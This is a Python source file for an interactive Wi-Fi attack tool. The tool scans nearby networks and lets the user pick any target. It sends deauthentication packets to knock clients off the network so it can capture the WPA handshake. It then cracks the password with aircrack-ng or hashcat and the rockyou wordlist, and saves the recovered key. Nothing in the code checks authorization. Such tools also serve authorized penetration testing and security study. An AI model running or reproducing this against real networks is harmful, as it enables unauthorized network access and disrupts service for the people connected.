#!/usr/bin/env python3

from rich.console import Console
import subprocess
import time
import os
import shutil
from datetime import datetime
from modules.utils import (
    get_interface,
    setup_monitor_mode,
    get_data_path,
    cleanup_temp_files
)
import json
from rich.progress import Progress

class HandshakeCaptureV2:
    def __init__(self):
        self.console = Console()
        self.interface = None
        self.target_bssid = None
        self.target_channel = None
        self.target_essid = None
        self.capture_file = None
        self.data_path = self._setup_data_paths()

    def _setup_data_paths(self):
        """Setup required data directories"""
        paths = {
            'captures': get_data_path('handshakes', ''),
            'passwords': get_data_path('passwords', '')
        }
        
        for path in paths.values():
            os.makedirs(path, exist_ok=True)
        
        return paths

    def scan_networks(self):
        """Scan for available networks"""
        try:
            # Create temporary file for scan results
            temp_file = f"/tmp/scan_{int(time.time())}"
            
            # Start airodump-ng scan
            scan_cmd = [
                'airodump-ng',
                '--output-format', 'csv',
                '--write', temp_file,
                self.interface
            ]
            
            self.console.print("\n[yellow]Scanning for networks (10 seconds)...[/yellow]")
            
            scan_process = subprocess.Popen(
                scan_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(10)  # Scan for 10 seconds
            scan_process.terminate()
            time.sleep(1)  # Wait for files to be written
            
            networks = []
            try:
                with open(f"{temp_file}-01.csv", 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    
                    for line in lines[2:]:  # Skip headers
                        if line.strip() and ',' in line:
                            parts = line.strip().split(',')
                            if len(parts) >= 14:  # Valid network line
                                essid = parts[13].strip()
                                if essid and essid != "":  # Only add networks with valid ESSID
                                    networks.append({
                                        'bssid': parts[0].strip(),
                                        'channel': parts[3].strip(),
                                        'essid': essid
                                    })
            except:
                pass
            finally:
                # Cleanup
                os.system(f"rm -f {temp_file}*")
            
            return networks
            
        except Exception as e:
            self.console.print(f"[red]Error scanning networks: {str(e)}[/red]")
            return []

    def select_target(self, networks):
        """Let user select target network"""
        if not networks:
            self.console.print("[red]No networks found![/red]")
            return False
            
        self.console.print("\n[green]Available Networks:[/green]")
        for idx, network in enumerate(networks, 1):
            self.console.print(
                f"{idx}. {network['essid']} "
                f"(BSSID: {network['bssid']}, "
                f"Channel: {network['channel']})"
            )
        
        while True:
            try:
                choice = int(input("\nSelect target network (1-{}): ".format(len(networks))))
                if 1 <= choice <= len(networks):
                    network = networks[choice - 1]
                    self.target_bssid = network['bssid']
                    self.target_channel = network['channel']
                    self.target_essid = network['essid']
                    return True
            except ValueError:
                pass
            self.console.print("[red]Invalid choice![/red]")
        
        return False

    def capture_handshake(self):
        """Capture WPA handshake using targeted deauth"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.capture_file = os.path.join(
                self.data_path['captures'],
                f'handshake_{self.target_bssid.replace(":", "")}_{timestamp}'
            )
            
            # Start airodump-ng to capture handshake
            capture_cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', self.target_channel,
                '--write', self.capture_file,
                '--output-format', 'pcap',
                self.interface
            ]
            
            capture_process = subprocess.Popen(
                capture_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Wait for airodump-ng to initialize
            time.sleep(2)
            
            # Get connected clients
            clients = self.get_connected_clients()
            
            if clients:
                self.console.print(f"\n[green]Found {len(clients)} connected clients[/green]")
                
                # Send deauth to each client
                for client in clients:
                    self.console.print(f"[cyan]Deauthenticating client: {client}[/cyan]")
                    
                    # Send 10 deauth packets
                    for _ in range(10):
                        deauth_cmd = [
                            'aireplay-ng',
                            '--deauth', '1',
                            '-a', self.target_bssid,
                            '-c', client,
                            self.interface
                        ]
                        subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(0.1)
                        
                        # Check for handshake
                        if self.verify_handshake():
                            capture_process.terminate()
                            return True
                    
                    time.sleep(0.5)  # Wait between clients
            else:
                self.console.print("\n[yellow]No clients found. Sending broadcast deauth...[/yellow]")
                
                # Send broadcast deauth
                for _ in range(10):
                    deauth_cmd = [
                        'aireplay-ng',
                        '--deauth', '1',
                        '-a', self.target_bssid,
                        self.interface
                    ]
                    subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(0.1)
                    
                    # Check for handshake
                    if self.verify_handshake():
                        capture_process.terminate()
                        return True
            
            capture_process.terminate()
            return self.verify_handshake()
            
        except Exception as e:
            self.console.print(f"[red]Error capturing handshake: {str(e)}[/red]")
            return False

    def get_connected_clients(self):
        """Get list of connected clients"""
        try:
            clients = set()
            temp_file = f"/tmp/clients_{int(time.time())}"
            
            # Monitor for clients
            monitor_cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', self.target_channel,
                '--write', temp_file,
                '--output-format', 'csv',
                self.interface
            ]
            
            process = subprocess.Popen(
                monitor_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(5)  # Monitor for 5 seconds
            process.terminate()
            
            # Parse results
            try:
                with open(f"{temp_file}-01.csv", 'r') as f:
                    lines = f.readlines()
                    
                    client_section = False
                    for line in lines:
                        if 'Station MAC' in line:
                            client_section = True
                            continue
                        if client_section and line.strip() and ',' in line:
                            parts = line.strip().split(',')
                            if len(parts) >= 6 and parts[5].strip() == self.target_bssid:
                                clients.add(parts[0].strip())
            except:
                pass
            finally:
                os.system(f"rm -f {temp_file}*")
            
            return list(clients)
            
        except Exception as e:
            self.console.print(f"[red]Error getting clients: {str(e)}[/red]")
            return []

    def verify_handshake(self):
        """Verify if handshake was captured"""
        try:
            capfile = f"{self.capture_file}-01.cap"
            if not os.path.exists(capfile):
                return False
                
            # Check with aircrack-ng
            cmd = ['aircrack-ng', capfile]
            process = subprocess.run(cmd, capture_output=True, text=True)
            return "1 handshake" in process.stdout
            
        except Exception as e:
            self.console.print(f"[red]Error verifying handshake: {str(e)}[/red]")
            return False

    def create_session(self, method, wordlist):
        """Create a cracking session for resume capability"""
        session_file = os.path.join(
            self.data_path['passwords'],
            f'session_{self.target_bssid.replace(":", "")}_{method}.session'
        )
        
        session_data = {
            'bssid': self.target_bssid,
            'essid': self.target_essid,
            'method': method,
            'wordlist': wordlist,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'progress': 0,
            'status': 'running'
        }
        
        with open(session_file, 'w') as f:
            json.dump(session_data, f)
            
        return session_file

    def load_session(self, session_file):
        """Load an existing cracking session"""
        try:
            with open(session_file, 'r') as f:
                return json.load(f)
        except:
            return None

    def update_session(self, session_file, progress, status='running'):
        """Update session progress"""
        try:
            session_data = self.load_session(session_file)
            if session_data:
                session_data['progress'] = progress
                session_data['status'] = status
                with open(session_file, 'w') as f:
                    json.dump(session_data, f)
        except:
            pass

    def crack_with_hashcat(self, capfile, wordlist):
        """Crack handshake using hashcat with GPU acceleration and session management"""
        try:
            # Convert cap to hccapx format for hashcat
            hccapx_file = os.path.join(self.data_path['passwords'], f'hash_{self.target_bssid.replace(":", "")}.hccapx')
            convert_cmd = [
                'cap2hccapx',
                capfile,
                hccapx_file
            ]
            subprocess.run(convert_cmd, check=True)

            if not os.path.exists(hccapx_file):
                self.console.print("[red]Failed to convert capture file to hashcat format[/red]")
                return False

            # Create or load session
            session_file = self.create_session('hashcat', wordlist)

            # Setup hashcat command with session and performance options
            hashcat_cmd = [
                'hashcat',
                '-m', '2500',      # WPA/WPA2 mode
                '-w', '3',         # Workload profile (1-4)
                '--status',        # Enable status updates
                '--restore',       # Enable session restore
                '--session', os.path.splitext(session_file)[0],  # Session name
                '-O',             # Optimize for performance
                '--gpu-temp-abort=90',  # Prevent GPU overheating
                '-o', os.path.join(self.data_path['passwords'], f'cracked_{self.target_bssid.replace(":", "")}.txt'),
                hccapx_file,
                wordlist
            ]

            # Ask for number of threads
            try:
                import multiprocessing
                max_threads = multiprocessing.cpu_count()
                threads = input(f"\nEnter number of threads (1-{max_threads}, default={max_threads}): ").strip()
                if threads.isdigit() and 1 <= int(threads) <= max_threads:
                    hashcat_cmd.extend(['-T', threads])
            except:
                pass

            process = subprocess.Popen(
                hashcat_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                universal_newlines=True
            )

            # Monitor progress
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break

                # Update progress based on hashcat output
                if "Progress" in line:
                    progress = line.strip().split()[-1].rstrip('%')
                    self.update_session(session_file, float(progress))
                    self.console.print(f"[cyan]{line.strip()}[/cyan]", end='\r')
                elif "Recovered" in line and "(" in line:
                    password = line.split("(")[1].split(")")[0].strip()
                    self.update_session(session_file, 100, 'completed')
                    return password

            self.update_session(session_file, 100, 'failed')
            return None

        except KeyboardInterrupt:
            self.console.print("\n[yellow]Cracking paused. Session saved.[/yellow]")
            self.update_session(session_file, -1, 'paused')
            return None
        except Exception as e:
            self.console.print(f"[red]Error during GPU cracking: {str(e)}[/red]")
            self.update_session(session_file, -1, 'error')
            return None

    def list_sessions(self):
        """List all available cracking sessions"""
        sessions = []
        for file in os.listdir(self.data_path['passwords']):
            if file.startswith('session_') and file.endswith('.session'):
                session_data = self.load_session(os.path.join(self.data_path['passwords'], file))
                if session_data:
                    sessions.append(session_data)
        return sessions

    def resume_session(self, session_data):
        """Resume a paused cracking session"""
        self.target_bssid = session_data['bssid']
        self.target_essid = session_data['essid']
        
        if session_data['method'] == 'hashcat':
            return self.crack_with_hashcat(self.capture_file, session_data['wordlist'])
        else:
            return self.crack_with_aircrack(self.capture_file, session_data['wordlist'])

    def crack_with_aircrack(self, capfile, wordlist):
        """CPU-based cracking using aircrack-ng with detailed progress display"""
        try:
            password_file = os.path.join(self.data_path['passwords'], f'password_{self.target_bssid.replace(":", "")}.txt')
            
            # Get total number of passwords in wordlist for progress calculation
            total_keys = 0
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                total_keys = sum(1 for _ in f)
            
            crack_cmd = [
                'aircrack-ng',
                '-w', wordlist,
                '-l', password_file,
                '-b', self.target_bssid,
                capfile
            ]
            
            process = subprocess.Popen(
                crack_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            start_time = time.time()
            last_keys_tested = 0
            keys_per_second = 0
            
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                    
                if "KEY FOUND!" in line:
                    with open(password_file, 'r') as f:
                        return f.read().strip()
                elif "Tested" in line or "keys tested" in line.lower():
                    try:
                        # Extract keys tested
                        keys_tested = int(line.split('(')[1].split(' ')[0])
                        
                        # Calculate progress percentage
                        progress = (keys_tested / total_keys) * 100 if total_keys > 0 else 0
                        
                        # Calculate speed
                        current_time = time.time()
                        time_diff = current_time - start_time
                        if time_diff >= 1:  # Update speed every second
                            keys_per_second = (keys_tested - last_keys_tested) / time_diff
                            last_keys_tested = keys_tested
                            start_time = current_time
                        
                        # Estimate time remaining
                        if keys_per_second > 0:
                            keys_remaining = total_keys - keys_tested
                            time_remaining = keys_remaining / keys_per_second
                            hours = int(time_remaining / 3600)
                            minutes = int((time_remaining % 3600) / 60)
                            seconds = int(time_remaining % 60)
                            
                            # Create progress bar
                            bar_width = 40
                            filled = int(bar_width * progress / 100)
                            bar = '=' * filled + '-' * (bar_width - filled)
                            
                            status = (
                                f"\r[Progress: [{bar}] {progress:.1f}%] "
                                f"[Speed: {keys_per_second:,.0f} keys/s] "
                                f"[Remaining: {hours:02d}:{minutes:02d}:{seconds:02d}] "
                                f"[{keys_tested:,}/{total_keys:,} keys]"
                            )
                            self.console.print(f"[cyan]{status}[/cyan]", end='')
                    except:
                        # Fallback to simple progress display
                        self.console.print(f"[cyan]{line.strip()}[/cyan]", end='\r')
            
            return None

        except Exception as e:
            self.console.print(f"[red]Error during CPU cracking: {str(e)}[/red]")
            return None
        finally:
            try:
                process.kill()
            except:
                pass

    def crack_password(self, capture_file):
        """Crack the captured handshake using rockyou.txt"""
        try:
            if not os.path.exists(capture_file):
                self.console.print("[red]Error: Capture file not found![/red]")
                return False

            # Setup paths
            password_file = os.path.join(self.data_path['passwords'], f'password_{self.target_bssid.replace(":", "")}.txt')
            rockyou_path = "/usr/share/wordlists/rockyou.txt"
            custom_rockyou = os.path.join(self.data_path['passwords'], 'rockyou.txt')

            # Check for rockyou.txt
            if not os.path.exists(rockyou_path) and not os.path.exists(custom_rockyou):
                self.console.print("\n[yellow]rockyou.txt not found. Would you like to download it? (y/n)[/yellow]")
                if input().lower() == 'y':
                    self.console.print("[cyan]Downloading rockyou.txt (this may take a few minutes)...[/cyan]")
                    try:
                        download_cmd = [
                            'wget',
                            'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',
                            '-O', custom_rockyou
                        ]
                        subprocess.run(download_cmd, check=True)
                        self.console.print("[green]Successfully downloaded rockyou.txt![/green]")
                        wordlist = custom_rockyou
                    except Exception as e:
                        self.console.print(f"[red]Failed to download rockyou.txt: {str(e)}[/red]")
                        return False
                else:
                    self.console.print("[yellow]Cannot proceed without wordlist.[/yellow]")
                    return False
            else:
                wordlist = custom_rockyou if os.path.exists(custom_rockyou) else rockyou_path

            # Count passwords in wordlist
            self.console.print("\n[cyan]Counting passwords in wordlist...[/cyan]")
            total_passwords = 0
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                total_passwords = sum(1 for _ in f)
            
            self.console.print(f"[green]Found {total_passwords:,} passwords in wordlist[/green]")
            self.console.print("\n[cyan]Starting password cracking...[/cyan]")

            # Start cracking process
            crack_cmd = [
                'aircrack-ng',
                '-w', wordlist,
                '-l', password_file,
                '-b', self.target_bssid,
                capture_file
            ]

            process = subprocess.Popen(
                crack_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )

            with Progress() as progress:
                task = progress.add_task("[cyan]Cracking password...", total=total_passwords)
                
                try:
                    while process.poll() is None:
                        line = process.stdout.readline()
                        if not line:
                            continue

                        if "KEY FOUND!" in line:
                            with open(password_file, 'r') as f:
                                password = f.read().strip()
                                self.console.print(f"\n[green]Password found: {password}[/green]")

                                # Save detailed results
                                results_file = os.path.join(self.data_path['passwords'], 
                                    f'details_{self.target_bssid.replace(":", "")}.txt')
                                with open(results_file, 'w') as rf:
                                    rf.write(f"Network: {self.target_essid}\n")
                                    rf.write(f"BSSID: {self.target_bssid}\n")
                                    rf.write(f"Channel: {self.target_channel}\n")
                                    rf.write(f"Password: {password}\n")
                                    rf.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

                                return True

                        elif "Tested" in line:
                            try:
                                tested = int(line.split('(')[1].split(' ')[0])
                                progress.update(task, completed=min(tested, total_passwords))
                            except:
                                continue

                finally:
                    if process.poll() is None:
                        process.terminate()
                        process.wait()

            self.console.print("\n[yellow]Password not found in wordlist.[/yellow]")
            return False

        except Exception as e:
            self.console.print(f"\n[red]Error during password cracking: {str(e)}[/red]")
            return False

    def start_capture(self):
        """Main method to start handshake capture process"""
        try:
            # Get interface
            self.interface = get_interface()
            if not self.interface:
                return
            
            # Setup monitor mode
            self.interface = setup_monitor_mode(self.interface)
            if not self.interface:
                self.console.print("[red]Failed to enable monitor mode![/red]")
                return
            
            # Scan networks
            networks = self.scan_networks()
            if not self.select_target(networks):
                return
            
            self.console.print(f"\n[cyan]Starting capture for {self.target_essid}[/cyan]")
            
            if self.capture_handshake():
                self.console.print("\n[green]Handshake captured successfully![/green]")
                capture_file = f"{self.capture_file}-01.cap"
                self.console.print(f"[green]Capture saved to: {capture_file}[/green]")
                
                # Ask to crack password
                self.console.print("\n[cyan]Would you like to crack the password? (y/n)[/cyan]")
                if input().lower() == 'y':
                    self.crack_password(capture_file)
            else:
                self.console.print("\n[red]Failed to capture handshake![/red]")
            
        except KeyboardInterrupt:
            self.console.print("\n[yellow]Capture stopped by user[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")
        finally:
            # Cleanup
            try:
                subprocess.run(['airmon-ng', 'stop', self.interface],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
                cleanup_temp_files()
            except:
                pass
            
            input("\nPress Enter to continue...") 